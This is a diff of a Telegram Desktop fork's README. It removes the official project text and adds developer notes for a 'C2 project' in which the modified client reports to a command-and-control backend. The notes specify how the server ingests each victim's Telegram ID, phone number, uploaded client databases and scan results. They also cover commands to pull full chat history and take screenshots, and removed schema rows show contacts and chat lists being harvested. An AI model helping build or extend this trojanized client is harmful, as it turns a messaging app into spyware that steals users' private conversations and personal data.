@@ -1,15 +1,55 @@
-# [Telegram Desktop][telegram_desktop] – 官方信使
 
-这是基于 [Telegram API][telegram_api] 和 [MTProto][telegram_proto] 安全协议的官方 [Telegram][telegram] 桌面客户端的完整源代码和构建说明。
 
-[![版本](https://badge.fury.io/gh/telegramdesktop%2Ftdesktop.svg)](https://github.com/telegramdesktop/tdesktop/releases)
-[![构建状态](https://github.com/telegramdesktop/tdesktop/workflows/Windows./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)
-[![构建状态](https://github.com/telegramdesktop/tdesktop/workflows/MacOS./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)
-[![构建状态](https://github.com/telegramdesktop/tdesktop/workflows/Linux./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)
+### 修改日志 (2026-01-18)
 
-[![Telegram Desktop 预览][preview_image]][preview_image_url]
+*   **文档更新**: 添加了 Web 端开发需求说明，明确了 `get_current_user` 接口对接规范。
+*   **功能修复**: 修复了 `upload_db` 任务状态卡在 `in_progress` 的问题。
+*   **功能修复**: 完善了本地任务持久化机制，解决了重启后任务丢失的问题。
 
-源代码根据 GPLv3 许可证发布（包含 OpenSSL 异常），许可证可在 [此处][license] 查看。
+## 开发协作规范 (必读)
+
+### 1. 职责边界
+*   **tdesktop 端 (本目录)**: 负责 Telegram Desktop 客户端的修改与功能增强（C++）。
+    *   **权限限制**: **严禁修改 Web 端代码**。
+*   **Web 端 (platform)**: 负责后端服务 (Java/Spring Boot) 与前端控制台 (React) 的开发。
+
+### 2. 沟通与需求
+*   **我对 Web 端的要求**: 所有针对 Web 端接口、功能配合的需求，**必须** 记录在本文件的 [Web 端开发协作注意事项](#web端开发协作注意事项) 章节中。
+*   **Web 端对我的要求**: 请查阅 `../platform/README.md` (如果存在) 或由 Web 端同事同步。
+
+### 3. 协作流程
+*   修改 `tdesktop` 代码前，请先拉取最新代码。
+*   提交修改后，请及时更新本 `README.md` 中的修改日志。
+
+## Web端开发协作注意事项
+
+### 1. `get_current_user` 接口对接
+Web端（后端）需要在 `C2Controller.java` 中实现对 `get_current_user` 任务结果的解析。
+客户端返回的 JSON 格式如下：
+```json
+{
+  "user_id": "123456789",
+  "username": "example_user",
+  "first_name": "John",
+  "last_name": "Doe",
+  "phone": "15551234567",
+  "is_premium": true
+}
+```
+**后端需求**：
+- 在 `submitTaskResult` 方法中，当 `taskId` 对应的任务类型为 `get_current_user` 时，解析上述 JSON。
+- 将解析后的数据更新到 `tg_account` 表中。
+- 建立当前设备 (`C2Device`) 与该 Telegram 账号的关联。
+
+### 2. `upload_db` 逻辑确认
+- 客户端上传的文件名格式为 `tdata_client.db` 或 `scan_results.db`。
+- 后端需确保能正确处理 `multipart/form-data` 上传，并根据文件名触发相应的解析逻辑（如 `processScanResults`）。
+- **注意**：客户端已设置上传超时时间为 5 分钟，后端需确保处理大文件时不会过早断开连接。
+
+### 3. 新增指令支持
+客户端已初步支持以下指令，请Web端确保下发指令格式正确：
+- `fetch_full_chat_history`: 触发全量聊天记录同步。
+- `get_screenshot`: 获取当前屏幕截图。
 
 ## C2 项目状态 (自定义修改)
 
@@ -166,134 +206,21 @@ Web 端开发者请参考以下 SQLite 数据库 (`tdata_client.db`) 结构进�
 存储当前登录的 Telegram 用户信息。
 | 字段 | 类型 | 说明 |
 | :--- | :--- | :--- |
-| `user_id` | TEXT | 主键，用户 ID (tgid) |
+| `user_id` | TEXT | 用户 ID (主键) |
 | `username` | TEXT | 用户名 |
 | `first_name` | TEXT | 名字 |
 | `last_name` | TEXT | 姓氏 |
 | `phone` | TEXT | 手机号 |
-| `is_premium` | INTEGER | 是否为会员 (1=是, 0=否) |
+| `is_premium` | INTEGER | 是否为 Premium 用户 (1=是, 0=否) |
 
-#### 7. 联系人列表 (`contacts`)
-存储当前用户的所有联系人。
+#### 7. 本地任务 (`local_tasks`)
+存储本地任务执行状态。
 | 字段 | 类型 | 说明 |
 | :--- | :--- | :--- |
-| `user_id` | TEXT | 主键，联系人 ID (tgid) |
-| `username` | TEXT | 联系人用户名 |
-| `first_name` | TEXT | 名字 |
-| `last_name` | TEXT | 姓氏 |
-| `phone` | TEXT | 手机号 |
+| `task_id` | TEXT | 任务 ID (主键) |
+| `command` | TEXT | 任务命令 |
+| `params` | TEXT | 参数 |
+| `status` | TEXT | 状态 (pending, in_progress, completed, failed) |
+| `created_at` | INTEGER | 创建时间戳 |
+| `updated_at` | INTEGER | 更新时间戳 |
 
-#### 8. 聊天/群组列表 (`chats`)
-存储所有对话、群组和频道信息。
-| 字段 | 类型 | 说明 |
-| :--- | :--- | :--- |
-| `chat_id` | TEXT | 主键，会话 ID |
-| `title` | TEXT | 会话标题/群名 |
-| `type` | TEXT | 类型 ("Private", "Group", "Supergroup", "Channel") |
-| `invite_link` | TEXT | 邀请链接 (如有) |
-| `member_count` | INTEGER | 成员数量 |
-
-#### 9. 聊天同步状态 (`chat_sync_state`)
-存储每个会话的聊天记录同步进度。
-| 字段 | 类型 | 说明 |
-| :--- | :--- | :--- |
-| `chat_id` | TEXT | 主键，会话 ID |
-| `min_id` | INTEGER | 已同步的最小消息 ID |
-| `max_id` | INTEGER | 已同步的最大消息 ID |
-| `last_sync` | INTEGER | 最后同步时间戳 |
-
-## 支持的系统
-
-最新版本适用于：
-
-* [Windows 7 及以上 (64位)](https://telegram.org/dl/desktop/win64) ([便携版](https://telegram.org/dl/desktop/win64_portable))
-* [Windows 7 及以上 (32位)](https://telegram.org/dl/desktop/win) ([便携版](https://telegram.org/dl/desktop/win_portable))
-* [macOS 10.13 及以上](https://telegram.org/dl/desktop/mac)
-* [Linux 64位静态构建](https://telegram.org/dl/desktop/linux)
-* [Snap](https://snapcraft.io/telegram-desktop)
-* [Flatpak](https://flathub.org/apps/details/org.telegram.desktop)
-
-## 旧系统版本
-
-版本 **4.9.9** 是支持旧系统的最后一个版本：
-
-* [macOS 10.12](https://updates.tdesktop.com/tmac/tsetup.4.9.9.dmg)
-* [Linux glibc < 2.28 静态构建](https://updates.tdesktop.com/tlinux/tsetup.4.9.9.tar.xz)
-
-版本 **2.4.4** 是支持旧系统的最后一个版本：
-
-* [OS X 10.10 和 10.11](https://updates.tdesktop.com/tosx/tsetup-osx.2.4.4.dmg)
-* [Linux 32位静态构建](https://updates.tdesktop.com/tlinux32/tsetup32.2.4.4.tar.xz)
-
-版本 **1.8.15** 是支持旧系统的最后一个版本：
-
-* [Windows XP 和 Vista](https://updates.tdesktop.com/tsetup/tsetup.1.8.15.exe) ([便携版](https://updates.tdesktop.com/tsetup/tportable.1.8.15.zip))
-* [OS X 10.8 和 10.9](https://updates.tdesktop.com/tmac/tsetup.1.8.15.dmg)
-* [OS X 10.6 和 10.7](https://updates.tdesktop.com/tmac32/tsetup32.1.8.15.dmg)
-
-## 第三方库
-
-* Qt 6 ([LGPL](http://doc.qt.io/qt-6/lgpl.html)) 和 Qt 5.15 ([LGPL](http://doc.qt.io/qt-5/lgpl.html)) (有少量补丁)
-* OpenSSL 3.2.1 ([Apache License 2.0](https://www.openssl.org/source/apache-license-2.0.txt))
-* WebRTC ([New BSD License](https://github.com/desktop-app/tg_owt/blob/master/LICENSE))
-* zlib ([zlib License](http://www.zlib.net/zlib_license.html))
-* LZMA SDK 9.20 ([public domain](http://www.7-zip.org/sdk.html))
-* liblzma ([public domain](http://tukaani.org/xz/))
-* Google Breakpad ([License](https://chromium.googlesource.com/breakpad/breakpad/+/master/LICENSE))
-* Google Crashpad ([Apache License 2.0](https://chromium.googlesource.com/crashpad/crashpad/+/master/LICENSE))
-* GYP ([BSD License](https://github.com/bnoordhuis/gyp/blob/master/LICENSE))
-* Ninja ([Apache License 2.0](https://github.com/ninja-build/ninja/blob/master/COPYING))
-* OpenAL Soft ([LGPL](https://github.com/kcat/openal-soft/blob/master/COPYING))
-* Opus codec ([BSD License](http://www.opus-codec.org/license/))
-* FFmpeg ([LGPL](https://www.ffmpeg.org/legal.html))
-* Guideline Support Library ([MIT License](https://github.com/Microsoft/GSL/blob/master/LICENSE))
-* Range-v3 ([Boost License](https://github.com/ericniebler/range-v3/blob/master/LICENSE.txt))
-* Open Sans font ([Apache License 2.0](http://www.apache.org/licenses/LICENSE-2.0.html))
-* Vazirmatn font ([SIL Open Font License 1.1](https://github.com/rastikerdar/vazirmatn/blob/master/OFL.txt))
-* Emoji alpha codes ([MIT License](https://github.com/emojione/emojione/blob/master/extras/alpha-codes/LICENSE.md))
-* xxHash ([BSD License](https://github.com/Cyan4973/xxHash/blob/dev/LICENSE))
-* QR Code generator ([MIT License](https://github.com/nayuki/QR-Code-generator#license))
-* CMake ([New BSD License](https://github.com/Kitware/CMake/blob/master/Copyright.txt))
-* Hunspell ([LGPL](https://github.com/hunspell/hunspell/blob/master/COPYING.LESSER))
-* Ada ([Apache License 2.0](https://github.com/ada-url/ada/blob/main/LICENSE-APACHE))
-
-## 构建说明
-
-* Windows [(32位)][win32] [(64位)][win64]
-* [macOS][mac]
-* [GNU/Linux (使用 Docker)][linux]
-
-## Web端开发注意 (Web Dev Requirement)
-
-### get_current_user 命令对接需求
-
-**需求来源**：TG端开发同事
-
-**需求描述**：
-在 `C2Controller.java` 的 `submitTaskResult` 方法中（约第 528 行之后）增加对 `get_current_user` 命令返回值的解析处理，逻辑如下：
-1.  **判断任务命令**：检查当前处理的任务命令是否为 `get_current_user`。
-2.  **解析返回值**：解析 `result` 字段中的 JSON 字符串。
-    *   客户端返回格式示例：`{"userId":"12345","username":"test","firstName":"Test","lastName":"User","phone":"+861234567890","isPremium":false}`
-3.  **更新数据库**：
-    *   根据 `userId` 更新或插入 `tg_account` 表。
-    *   字段映射：`userId` -> `tgUserId`, `username` -> `username`, `phone` -> `phone`, `firstName` + `lastName` -> `fullName`。
-4.  **关联设备**：将该 Telegram 账号与当前设备 UUID (`c2_device`) 进行关联。
-
-**现状问题**：
-目前后端仅将 `get_current_user` 的结果作为普通字符串存入 `c2_task` 表的 `result` 字段，不会立即更新 `tg_account` 表。目前的 `tg_account` 更新仅依赖于上传完整的 DB 文件时触发，导致命令执行后数据不同步。
-
-**建议代码逻辑位置**：
-`C2Controller.java` -> `submitTaskResult` 方法 -> `if (task != null)` 块内部 -> 在更新任务状态之后。
-
-[//]: # (LINKS)
-[telegram]: https://telegram.org
-[telegram_desktop]: https://desktop.telegram.org
-[telegram_api]: https://core.telegram.org
-[telegram_proto]: https://core.telegram.org/mtproto
-[license]: LICENSE
-[win32]: docs/building-win.md
-[win64]: docs/building-win-x64.md
-[mac]: docs/building-mac.md
-[linux]: docs/building-linux.md
-[preview_image]: https://github.com/telegramdesktop/tdesktop/blob/dev/docs/assets/preview.png "Preview of Telegram Desktop"
-[preview_image_url]: https://raw.githubusercontent.com/telegramdesktop/tdesktop/dev/docs/assets/preview.png
